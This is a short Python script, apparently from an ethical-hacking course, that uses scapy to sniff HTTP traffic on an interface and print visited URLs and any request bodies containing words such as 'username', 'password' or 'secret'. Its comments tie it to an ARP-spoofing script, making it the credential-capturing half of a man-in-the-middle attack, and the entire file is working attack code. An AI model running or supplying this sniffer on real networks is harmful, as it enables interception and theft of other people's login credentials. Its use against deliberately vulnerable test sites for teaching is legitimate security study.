#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


# http test site: http://testphp.vulnweb.com/login.php
# 1. Run with arp_spoof.py
# 2. Choose interface to sniff
# 3. Run packet_sniffer.py
#       Currently sniffs urls and usernames/passwords from Raw layer; these parameters can be adjusted in get_login_info()


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # (scapy.<DESIRED_LAYER_NAME>)
        load = packet[scapy.Raw].load  # the "load" field of Raw layer
        keywords = ["username", "user", "uname", "login", "log", "password", "pass", "pword", "credentials",
                    "credential", "secret", "key"]
        for word in keywords:
            if word in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")
